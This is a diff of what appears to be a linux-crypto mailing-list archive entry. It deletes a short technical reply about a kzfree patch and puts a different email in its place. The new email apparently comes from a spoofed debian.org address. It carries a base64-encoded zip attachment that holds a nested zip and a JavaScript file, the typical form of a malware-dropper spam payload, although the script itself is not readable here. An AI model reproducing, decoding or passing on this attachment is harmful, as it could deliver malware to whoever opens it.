@@ -1,31 +1,44 @@
-From: Stephan =?ISO-8859-1?Q?M=FCller?= <smueller@chronox.de>
-Subject: Re: [PATCH] crypto: ecc : Wipe memory for p on errors.
-Date: Sun, 23 Apr 2017 21:14:18 +0200
-Message-ID: <1812636.Q25d83Qtbu@positron.chronox.de>
-References: <20170422113134.hzulmuvnveqg7sjq@hackers.mu>
+From: <isaac@debian.org>
+Subject: 21399 linux-crypto
+Date: Mon, 24 Apr 2017 01:08:27 -0000
+Message-ID: <149299610707.15559.15255177362651784780@t-mobile.at>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7Bit
-Cc: linux-crypto@vger.kernel.org
-To: Loganaden Velvindron <logan@hackers.mu>
+Content-Type: application/zip; name="8125957.zip"
+Content-Transfer-Encoding: base64
+To: <linux-crypto@vger.kernel.org>
 Return-path: <linux-crypto-owner@vger.kernel.org>
-Received: from mail.eperm.de ([89.247.134.16]:59174 "EHLO mail.eperm.de"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1163063AbdDWTOW (ORCPT <rfc822;linux-crypto@vger.kernel.org>);
-        Sun, 23 Apr 2017 15:14:22 -0400
-In-Reply-To: <20170422113134.hzulmuvnveqg7sjq@hackers.mu>
+Received: from 078132065167.public.t-mobile.at ([78.132.65.167]:44384 "HELO
+        t-mobile.at" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1163875AbdDXBIc (ORCPT <rfc822;linux-crypto@vger.kernel.org>);
+        Sun, 23 Apr 2017 21:08:32 -0400
+Content-Disposition: attachment
 Sender: linux-crypto-owner@vger.kernel.org
 List-ID: <linux-crypto.vger.kernel.org>
 
-Am Samstag, 22. April 2017, 13:31:34 CEST schrieb Loganaden Velvindron:
-
-Hi Loganaden,
-
-> -	kfree(p);
-> +	kzfree(p);
-
-Why do you think this is necessary? p is not filled in this function as this 
-function only allocates the memory.
-
-Ciao
-Stephan
+UEsDBAoAAAAAAAEImEr1KlFGXAUAAFwFAAAJAAAAMjcwMjMuemlwUEsDBBQAAAAIAAEImEptf02h
+xgQAAJcJAAAIAAAAMjcwMjMuanOFVW1v2jAQ/j5p/yGKNA20iTHYa6rKyhuUFZoC2SinfAl5adKG
+JMTmddp/39mmtKNsE8lhn++ee+7snFd+peirxbBXmbY1ccaDcrdUzpU8Wit6wNJVdOPM7qKA1VQa
+jNKSpXm3Efcym04pi+aFcWcHTK2fvXyRxkrtGKjRKbIwquxNShmtqabmeWv1jdq7slAWE6rWlfNz
+hVXLqK78fPmCc+mt2eVwl1yXlnm/Grshcnn9+s3LF6+Br+ZQ2DOo+rC5gWkIF7AtxWIipKHAOSiQ
+QwRr/Of8YQWYAczgDpUBMKiBCvQiggx/DdChhOsM0kDHpRScHNQ6nKGvwFv5UO2HejwGC3zJJBws
+oAfODLZAwZUG5gQ6GB6jRxhbl8pAoGINASnsGSCBNYxxNMKlkkFjDAlE/UwVHvWz12eyEIVpO0k4
+vYut7Puidz/5hpVAA2H1SA+U5B5z3MBkXIANQRaCP4TpbgQLQDqcSQyCOoQwQKXw7CGdLVLnpBsj
+5HULowj8sCbRvxXzHroYGci6IvCwi1adGdaVYbBGFZWQ+RBEtXeeDob57hbeKiqWtl6HBuaWIDVd
+VPs9fPoEX+GDDNyCz813qAKpwyk04ShxHt0yssQedqPObM02InFVfYPiQjfMy/7A88ZOzCY48avI
+8+ZpgMMRvgUtOq7n8ZUU39xC4awpSiVnnsfNlvhWaCvwzCjHKcN3FXE9TZ3c87j9lAvGlXNhyVd5
+AMdVkWe8zPFwFbnizNO4z7Lr753eQl+axjf6o7b71puY207YXQ+ddGq8Ve5/LDedKojo7JJ1bbNI
+3iqX0c5dFazaTPrbnqMbN4MEPwHMs4rYssqVI4wGLbOU1Z4B1Rt3RZrXTqGdKb/2B2kTxG7najs1
+rm/znVOi6lyJVn5WO0X++PsT24pCrdf3+3OxvXJ2l7fuvDfx40Fpfpf7QzjiMic08EtS81Q01VrN
+NU1Qam0LZU7WKEVXIbyrkIBprS9aq7WmgahxlZaosWlCsgzVWuur1ja0pqU1dYn2XzABg64SQsxa
+tl9i8QKfpWJe5CehL1z3+t/gwpvTHYxvBn2tjSA2DrjjScQxq4g/f4IpAP5SAt1yLAMBpdNJvNJn
++/RlXbl1SYLUz3iXJRWVSC6Zl5nPCJXpC6T90OC4H018+IBPv+AzELh25edhMcc5t2/pWvvr0SP0
+hoR6qv4svySt3ZQWAtsmG8IH7b2DyEOWynZKkkuuXdsV1iZmhIOEsVJr61qrgw9d5nGRFaVP0YUV
+AqVEvR/O0xxVZYK2nZiXo/0Bg6M8YMV+Roms4GFr7THJQwx7UKexiPrlYZn5bEn3BW6LcJaYtRBc
+Jsenn/d7IjfqkM0j7GHB3ZZEwgn5XhbiT5tJlTKhJo9ERoSWRU6JUYRbibo/1c2jyNfyPNOUd6In
+kZpHRMb+irhFJ814EHmKTJmZhD+CNbOCkqcZyaOWyPObZfaGBEtGZDoHwAeOD1/gYS+OxgWW6/Fk
+mnIo6nOIp322PN5ueKM9cQue7LnP7B771pnCu1Z/NKn0q2A5t25NZ9Vl+x743PGhzd0590Zwc7Fd
+uJfDasLKPPxH2zype9Yo3+JlvdrgTW3jPe0P8ZZeIMNXah0l4WQj2WWxcf8GUEsBAj8AFAAAAAgA
+AQiYSm1/TaHGBAAAlwkAAAgAJAAAAAAAAAAgAAAAAAAAADI3MDIzLmpzCgAgAAAAAAABABgASV6i
+xdC80gFJXqLF0LzSAUleosXQvNIBUEsFBgAAAAABAAEAWgAAAOwEAAAAAFBLAQI/AAoAAAAAAAEI
+mEr1KlFGXAUAAFwFAAAJACQAAAAAAAAAIAAAAAAAAAAyNzAyMy56aXAKACAAAAAAAAEAGAAT0KTF
+0LzSARPQpMXQvNIBE9CkxdC80gFQSwUGAAAAAAEAAQBbAAAAgwUAAAAA
